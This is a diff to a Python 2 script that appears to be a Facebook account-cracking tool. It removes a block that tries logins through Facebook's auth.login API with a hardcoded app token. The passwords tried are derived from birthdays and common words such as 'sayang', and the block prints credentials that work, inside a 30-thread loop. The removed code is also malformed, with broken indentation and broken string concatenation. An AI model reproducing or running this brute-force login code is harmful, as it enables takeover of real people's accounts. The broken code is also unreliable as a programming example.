@@ -682,34 +682,8 @@ def pilih_super():
                                                                                                            if 'www.facebook.com' in q['error_msg']:
                                                                                                                print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass9
                                                                                                            else:
-                                                                                                               lahir = b['birthday']
-                                                                                                                   pass10 = lahir.replace('/', '')
-                                                                                                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                                                             if 'access_token' in q:
-                                                                                                                       print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass10
-                                                                                                                   else:
-                                                                                                                       if 'www.facebook.com' in q['error_msg']:
-                                                                                                                           print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass10
-                                                                                                                       else:
-                                                                                                                                pass11 = 'sayang'
-                                                                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                                                                                q = json.load(data)
-                                                                                                                                if 'access_token' in q:
-                                                                                                                                    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' sayang ' + pass11
-                                                                                                                                else:
-                                                                                                                                    if 'www.facebook.com' in q['error_msg']:
-                                                                                                                                        print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' sayang ' + pass11
-                                                                                                                                    else:
-                                                                                                                                            pass12 = 'mastertogel'
-                                                                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                                                                                            q = json.load(data)
-                                                                                                                                            if 'access_token' in q:
-                                                                                                                                                print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' sayang ' + pass12
-                                                                                                                                            else:
-                                                                                                                                                if 'www.facebook.com' in q['error_msg']:
-                                                                                                                                                    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' sayang ' + pass12
-                                                                                                                                                else:
-        except:
+                                                                                                              
+         except:
             pass
 
     p = ThreadPool(30)
